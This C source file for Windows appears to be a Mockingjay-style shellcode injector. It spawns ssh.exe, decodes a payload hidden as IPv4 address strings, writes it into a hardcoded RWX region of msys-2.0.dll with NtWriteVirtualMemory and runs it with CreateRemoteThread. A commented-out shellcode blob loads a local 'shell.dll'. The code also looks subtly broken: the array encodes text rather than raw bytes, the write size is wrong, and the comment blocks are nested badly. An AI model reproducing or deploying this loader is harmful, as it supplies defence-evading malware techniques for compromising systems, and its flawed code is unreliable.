#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <ntstatus.h>
#include <winternl.h>
//#include <ntdll.h>

#pragma comment(lib, "Dbghelp.lib")
//#pragma comment(lib, "ntdll.lib")

char* Ipv4Array[] = {
    "34.92.120.102", "99.92.120.52", "56.92.120.56", "51.92.120.101", "52.92.120.102", "48.92.120.101", "56.92.120.99", "48.92.120.48",
    "48.92.120.48", "48.92.120.48", "48.92.120.52", "49.92.120.53", "49.92.120.52", "49.92.120.53", "48.34.10.34", "92.120.53.50",
    "92.120.53.49", "92.120.53.54", "92.120.52.56", "92.120.51.49", "92.120.100.50", "92.120.54.53", "92.120.52.56", "92.120.56.98",
    "92.120.53.50", "92.120.54.48", "92.120.52.56", "92.120.56.98", "92.120.53.50", "34.10.34.92", "120.49.56.92", "120.52.56.92",
    "120.56.98.92", "120.53.50.92", "120.50.48.92", "120.52.56.92", "120.56.98.92", "120.55.50.92", "120.53.48.92", "120.52.56.92",
    "120.48.102.92", "120.98.55.92", "120.52.97.92", "120.52.97.34", "10.34.92.120", "52.100.92.120", "51.49.92.120", "99.57.92.120",
    "52.56.92.120", "51.49.92.120", "99.48.92.120", "97.99.92.120", "51.99.92.120", "54.49.92.120", "55.99.92.120", "48.50.92.120",
    "50.99.92.120", "50.48.92.120", "52.49.34.10", "34.92.120.99", "49.92.120.99", "57.92.120.48", "100.92.120.52", "49.92.120.48",
    "49.92.120.99", "49.92.120.101", "50.92.120.101", "100.92.120.53", "50.92.120.52", "49.92.120.53", "49.92.120.52", "56.92.120.56",
    "98.92.120.53", "50.34.10.34", "92.120.50.48", "92.120.56.98", "92.120.52.50", "92.120.51.99", "92.120.52.56", "92.120.48.49",
    "92.120.100.48", "92.120.56.98", "92.120.56.48", "92.120.56.56", "92.120.48.48", "92.120.48.48", "92.120.48.48", "92.120.52.56",
    "34.10.34.92", "120.56.53.92", "120.99.48.92", "120.55.52.92", "120.54.55.92", "120.52.56.92", "120.48.49.92", "120.100.48.92",
    "120.53.48.92", "120.56.98.92", "120.52.56.92", "120.49.56.92", "120.52.52.92", "120.56.98.92", "120.52.48.34", "10.34.92.120",
    "50.48.92.120", "52.57.92.120", "48.49.92.120", "100.48.92.120", "101.51.92.120", "53.54.92.120", "52.56.92.120", "102.102.92.120",
    "99.57.92.120", "52.49.92.120", "56.98.92.120", "51.52.92.120", "56.56.92.120", "52.56.34.10", "34.92.120.48", "49.92.120.100",
    "54.92.120.52", "100.92.120.51", "49.92.120.99", "57.92.120.52", "56.92.120.51", "49.92.120.99", "48.92.120.97", "99.92.120.52",
    "49.92.120.99", "49.92.120.99", "57.92.120.48", "100.92.120.52", "49.34.10.34", "92.120.48.49", "92.120.99.49", "92.120.51.56",
    "92.120.101.48", "92.120.55.53", "92.120.102.49", "92.120.52.99", "92.120.48.51", "92.120.52.99", "92.120.50.52", "92.120.48.56",
    "92.120.52.53", "92.120.51.57", "92.120.100.49", "34.10.34.92", "120.55.53.92", "120.100.56.92", "120.53.56.92", "120.52.52.92",
    "120.56.98.92", "120.52.48.92", "120.50.52.92", "120.52.57.92", "120.48.49.92", "120.100.48.92", "120.54.54.92", "120.52.49.92",
    "120.56.98.92", "120.48.99.34", "10.34.92.120", "52.56.92.120", "52.52.92.120", "56.98.92.120", "52.48.92.120", "49.99.92.120",
    "52.57.92.120", "48.49.92.120", "100.48.92.120", "52.49.92.120", "56.98.92.120", "48.52.92.120", "56.56.92.120", "52.56.92.120",
    "48.49.34.10", "34.92.120.100", "48.92.120.52", "49.92.120.53", "56.92.120.52", "49.92.120.53", "56.92.120.53", "101.92.120.53",
    "57.92.120.53", "97.92.120.52", "49.92.120.53", "56.92.120.52", "49.92.120.53", "57.92.120.52", "49.92.120.53", "97.34.10.34",
    "92.120.52.56", "92.120.56.51", "92.120.101.99", "92.120.50.48", "92.120.52.49", "92.120.53.50", "92.120.102.102", "92.120.101.48",
    "92.120.53.56", "92.120.52.49", "92.120.53.57", "92.120.53.97", "92.120.52.56", "92.120.56.98", "34.10.34.92", "120.49.50.92",
    "120.101.57.92", "120.53.55.92", "120.102.102.92", "120.102.102.92", "120.102.102.92", "120.53.100.92", "120.52.56.92", "120.98.97.92",
    "120.48.49.92", "120.48.48.92", "120.48.48.92", "120.48.48.92", "120.48.48.34", "10.34.92.120", "48.48.92.120", "48.48.92.120",
    "48.48.92.120", "52.56.92.120", "56.100.92.120", "56.100.92.120", "48.49.92.120", "48.49.92.120", "48.48.92.120", "48.48.92.120",
    "52.49.92.120", "98.97.92.120", "51.49.92.120", "56.98.34.10", "34.92.120.54", "102.92.120.56", "55.92.120.102", "102.92.120.100",
    "53.92.120.98", "98.92.120.102", "48.92.120.98", "53.92.120.97", "50.92.120.53", "54.92.120.52", "49.92.120.98", "97.92.120.97",
    "54.92.120.57", "53.92.120.98", "100.34.10.34", "92.120.57.100", "92.120.102.102", "92.120.100.53", "92.120.52.56", "92.120.56.51",
    "92.120.99.52", "92.120.50.56", "92.120.51.99", "92.120.48.54", "92.120.55.99", "92.120.48.97", "92.120.56.48", "92.120.102.98",
    "92.120.101.48", "34.10.34.92", "120.55.53.92", "120.48.53.92", "120.98.98.92", "120.52.55.92", "120.49.51.92", "120.55.50.92",
    "120.54.102.92", "120.54.97.92", "120.48.48.92", "120.53.57.92", "120.52.49.92", "120.56.57.92", "120.100.97.92", "120.102.102.34",
    "10.34.92.120", "100.53.92.120", "54.51.92.120", "54.100.92.120", "54.52.92.120", "50.101.92.120", "54.53.92.120", "55.56.92.120",
    "54.53.92.120", "50.48.92.120", "50.102.92.120", "54.51.92.120", "50.48.92.120", "54.51.92.120", "54.49.34.10", "34.92.120.54",
    "99.92.120.54", "51.92.120.50", "101.92.120.54", "53.92.120.55", "56.92.120.54", "53.92.120.48", "48.34.10.144"
};

#define NumberOfElements 303


typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR			S,
    BOOLEAN			Strict,
    PCSTR* Terminator,
    PVOID			Addr
    );


BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
        TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    PCSTR		Terminator = NULL;

    NTSTATUS	STATUS = NULL;

    // getting RtlIpv4StringToAddressA address from ntdll.dll
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
    if (pRtlIpv4StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // getting the real size of the shellcode (number of elements * 4 => original shellcode size)
    sBuffSize = NmbrOfElements * 4;
    // allocating mem, that will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;


    // loop through all the addresses saved in Ipv4Array
    for (int i = 0; i < NmbrOfElements; i++) {
        // Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
            // if failed ...
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv4Array[i], STATUS);
            return FALSE;
        }

        // tmp buffer will be used to point to where to write next (in the newly allocated memory)
        TmpBuffer = (PBYTE)(TmpBuffer + 4);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}


// Calculate the offset to the RWX memory region of a DLL
DWORD_PTR FindRWXOffset(HMODULE hModule)
{
    // Obtain the base address of the module
    DWORD_PTR baseAddress = (DWORD_PTR)hModule;

    // Obtain the IMAGE_DOS_HEADER
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;

    // Calculate the address of IMAGE_NT_HEADERS
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);

    // Verify the NT signature
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0; // Invalid PE file
    }

    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        DWORD characteristics = sectionHeader->Characteristics;

        // Check if section has executable, readable, and writable permissions
        if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (characteristics & IMAGE_SCN_MEM_READ) &&
            (characteristics & IMAGE_SCN_MEM_WRITE))
        {
            DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
            DWORD_PTR rwxOffset = baseAddress + sectionOffset;
            return rwxOffset;
        }

        sectionHeader++;
    }

    return 0; // No suitable section found
}

typedef NTSTATUS(WINAPI* LPfnNtWriteVirtualMemory)
(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

// "function call is not allowed in a constant expression" when trying to originally load ntdll.dll and NtWriteVirtualMemory, so i put it in a function
LPfnNtWriteVirtualMemory LoadNtWriteVirtualMemory()
{
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == NULL) 
    {
        printf("Failed to get handle on ntdll.dll\n");
        return NULL;
    }

    LPfnNtWriteVirtualMemory NtWriteVirtualMemory = (LPfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    if (NtWriteVirtualMemory == NULL) 
    {
        printf("Failed to get NtWriteVirtualMemory function pointer\n");
        return NULL;
    }

    return NtWriteVirtualMemory;
}

void WriteShellcode(HANDLE hProcess, PVOID address, const void* shellcode, SIZE_T shellcodeSize)
{
    LPfnNtWriteVirtualMemory NtWriteVirtualMemory = LoadNtWriteVirtualMemory();
    if (NtWriteVirtualMemory == NULL) 
    {
        printf("Failed to Load NtWriteVirtualMemory Function Pointer\n");
        return;
    }

    SIZE_T bytesWritten = 0;

    NTSTATUS status = NtWriteVirtualMemory(hProcess, address, shellcode, shellcodeSize, &bytesWritten);
    if (NT_SUCCESS(status)) 
    {
        printf("[+] Shellcode Successfully Written, Wait for Execution\n");
    }
    else 
    {
        printf("Failed to Write Shellcode. Error Code: 0x%08X\n", status);
    }
}

int main()
{
    // Specify the command to be executed by ssh.exe
    LPTSTR command = L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\ssh.exe";
    LPTSTR args = L"ssh.exe decoy@decoy.dom";

    // Launch ssh.exe with the specified command
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD dwCreationFlags = 0;

    if (!CreateProcessW(command, args, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &si, &pi)) //| DEBUG_ONLY_THIS_PROCESS | DEBUG_PROCESS
    {
        printf("Failed to create process. Error code: %d\n", GetLastError());
        return 1;
    }
    else
    {
        printf("[+] Successful Process Creation, Process ID: %lu\n", pi.dwProcessId);
        printf("[+] Process Handle: 0x%p\n", pi.hProcess);
    }

    WaitForSingleObject(pi.hProcess, 2000);

    // Specify the name of the DLL to search for
    const wchar_t* targetDllName = L"msys-2.0.dll";

    // Get the process ID of the target process
    DWORD targetProcessId = pi.dwProcessId;

    // Open the target process with necessary access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL)
    {
        printf("Failed to open process. Error code: %lu\n", GetLastError());
        return 1;
    }

    /*
    // Notepad shellcode to be written to the RWX memory region
    unsigned char shellcode[] =
    {
        "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75"
        "\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48"
        "\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
        "\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40"
        "\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"
        "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e"
        "\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52"
        "\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
        "\x5d\x48\x8d\x8d\xff\x00\x00\x00\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"
        "\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x43"
        "\x3a\x5c\x55\x73\x65\x72\x73\x5c\x43\x6f\x64\x79\x5c\x44"
        "\x6f\x77\x6e\x6c\x6f\x61\x64\x73\x5c\x73\x68\x65\x6c\x6c"
        "\x2e\x64\x6c\x6c\x00"
    };
    */
    
    // is this needed? was in the original Mockingjay article, but shellcode execution works without it
    if (!DebugActiveProcess(targetProcessId)) 
    {
        printf("[x] DebugActiveProcess failed with status 0x%x\n", GetLastError());
        CloseHandle(hProcess);  
        return 1;
    }
    else
    {
        printf("[+] Process is Being Debugged...\n");
    }

    WaitForSingleObject(hProcess, 2500);

    PBYTE pDecryptedShellcode = NULL;
    SIZE_T decryptedShellcodeSize = 0;

    if (Ipv4Deobfuscation(Ipv4Array, NumberOfElements, &pDecryptedShellcode, &decryptedShellcodeSize))
    {
        WriteShellcode(hProcess, (PVOID)0x21022C000, pDecryptedShellcode, sizeof(decryptedShellcodeSize));

        if (!DebugActiveProcessStop(targetProcessId))
        {
            printf("[+] Error Stopping Debugger!\n");
        }
        else
        {
            printf("[+] Debugger Stopped, Process Resumed\n");
        }

        if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)0x21022C000, NULL, 0, NULL))
        {
            printf("Failed to Create Thread in Remote Process and Execute. Error code: %lu\n", GetLastError());
        }
        else
        {
            printf("[+] Shellcode Successfully Executed in Remote Thread\n");
        }
    }
    
    /*
    // Write the shellcode to the RWX memory region
    SIZE_T bytesWritten = 0;

    // NtWriteVirtualMemory, WriteProcessMemory checks/updates memory protection before writing which defeats the point of using a known RWX section
    // hard coded the 0x21022C000 RWX region, will work on getting section parsing function to work
    WriteShellcode(hProcess, (PVOID)0x21022C000, shellcode, sizeof(shellcode));
    
    
    // is this needed? was in the original Mockingjay article, but shellcode execution works without it
    if (!DebugActiveProcessStop(targetProcessId))
    {
        printf("[+] Error Stopping Debugger!\n");
    }
    else
    {
        printf("[+] Debugger Stopped, Process Resumed\n");
    }
    
    /*
    if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)0x21022C000, NULL, 0, NULL))
    {
        printf("Failed to Create Thread in Remote Process and Execute. Error code: %lu\n", GetLastError());
    }
    else
    {
        printf("[+] Shellcode Successfully Executed in Remote Thread\n");
    }
    */

    WaitForSingleObject(hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
